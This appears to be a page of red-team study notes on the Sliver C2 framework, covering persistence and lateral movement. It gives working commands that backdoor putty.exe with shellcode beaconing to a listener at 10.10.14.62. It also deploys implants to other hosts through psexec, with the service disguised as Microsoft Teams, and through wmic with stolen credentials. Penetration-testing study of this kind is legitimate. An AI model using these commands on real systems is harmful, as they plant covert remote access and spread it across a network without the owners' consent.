| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|


* [Introduction](../../red_team/sliver/intro.md)
    * [Communication model](../../red_team/sliver/intro.md#communication-model)



    

-   [misc](#misc){#toc-misc}
    -   [Persistence](#persistence){#toc-persistence}
        -   [Sliver Backdoor](#sliver-backdoor){#toc-sliver-backdoor}
        -   [Other solutions](#other-solutions){#toc-other-solutions}
    -   [Lateral Movement](#lateral-movement){#toc-lateral-movement}
    -   [Anti-virus Evasion](#anti-virus-evasion){#toc-anti-virus-evasion}
    -   [Loot](#loot){#toc-loot}

# misc

## Persistence

### Sliver Backdoor

`backdoor` command inject a sliver shellcode into an existing file on
the target system. A profile that will serve as your base shellcode must
be created. Every time a user starts or attempts to the program, a
beacon will be created

for example:

    # create the profile
    profiles new --format shellcode --http 10.10.14.62:9002 persistence-shellcode

    # start the listener
    http -L 10.10.14.62 -l 9002

    # backdoor
    backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"

An \"under-the-hood\" overview of the whole process can be found in the
source-code of Sliver, specifically in the
[rpc-backdoor.go](https://github.com/BishopFox/sliver/blob/b7d0dcc5dd0c469b3792fd791af784278c369ecd/server/rpc/rpc-backdoor.go)
(and
[backdoor.go](https://github.com/BishopFox/sliver/blob/b7d0dcc5dd0c469b3792fd791af784278c369ecd/server/rpc/rpc-backdoor.go))
file. A high-level explanation of the process: checks if the target is
Windows and if not, it will terminate, takes the original binary,
validates the existence of the profile for the shellcode and then
includes the shellcode into the original binary, and uploads the
modified binary to the target, e.g., replacing the original one with a
tampered one.

### Other solutions

see [\[windows-persistence\]](#windows-persistence){reference-type="ref"
reference="windows-persistence"}

## Lateral Movement

when a host is compromised and we have access to another host as admin:

1.  set a pivot (tcp) on the current host
    `pivots tcp --bind <ip> --port <port>`

2.  generate an implant in `service` format to connect to the pivot
    `generate --format service -i <ip>:<port> --skip-symbols -N psexec-pivot`

3.  use `psexe` to install the implant on the target host
    `psexec --custom-exe ./psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams <target>`

alternative solution :

1.  generate an implantin `binary` format to connect to the pivot
    `generate -i <ip>:<port> --skip-symbols -N wmic-pivot`

2.  upload the implant `upload wmic-pivot.exe`

3.  exec the implant:
    `execute -o wmic /node:<ip> /user:<user> /password:<password> process call create "C:\\windows\tasks\\wmic-pivot.exe"`

## Anti-virus Evasion

## Loot

[\[](https://sliver.sh/docs?name=Loot)Loot\]
